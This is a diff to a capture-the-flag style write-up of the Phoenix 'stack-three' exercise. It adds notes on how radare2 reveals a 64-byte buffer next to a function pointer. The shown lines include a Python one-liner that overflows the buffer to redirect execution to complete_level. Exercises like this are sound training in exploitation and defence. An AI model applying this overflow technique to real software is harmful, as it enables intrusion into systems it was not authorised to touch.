@@ -2,6 +2,39 @@
 ## Static Analysis
 ##### Analyse the binary
 `r2 -A stack-three`
+##### Result
+
+  > calling function pointer @ 0x105d0
+> Congratulations, you've finished phoenix/stack-three :-) Well done!
+
+##### Learning
+In this challenge there were only a few Stack Variables..
+
+```
+[0x0001049c]> pd 5 @main
+|           ;-- $a:
+/ (fcn) main 120
+|   main (FILE *stream);
+|           ; var int local_54h @ fp-0x54
+|           ; var int local_50h @ fp-0x50
+|           ; var int local_8h @ fp-0x8
+|           ; arg FILE *stream @ r3
+```
+It was not immediately obvious with `Radare2` which stack variable held the C char buffer.  But if you looked closer at `the Offset` values it would give you a clue that `local_8h` was in fact a `Struct`.  This `Struct` was made up of two values; a char buffer (64) and an integer pointer (8).
+
+```
+?vi 0x50 - 0x8
+72
+
+After finishing the challenge, you could verify this against the code:
+
+72 = 64 char buffer + 8 for int pointer!
+
+struct {
+  char buffer[64];
+  volatile int (*fp)();
+} locals;
+```
 ##### Familiarity
 ```
 [0x0001049c]> i
@@ -37,7 +70,7 @@ Segmentation fault
 ```
 ##### Symbols
 ```
-[0x0001049c]> is
+[0x0001049c]> is~FUNC
 [Symbols]
 090 0x000005d0 0x000105d0 GLOBAL   FUNC   28 complete_level
 ```
@@ -64,9 +97,6 @@ $ python -c 'print "A"*(64) + "\xd0\x05\x01\x00"' | ./stack-three
 calling function pointer @ 0x105d0
 Congratulations, you've finished phoenix/stack-three :-) Well done!
 
-payload=$(python -c 'print "A"* 64')          
-➜  ~ echo $payload
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 ##### Source code
 ```
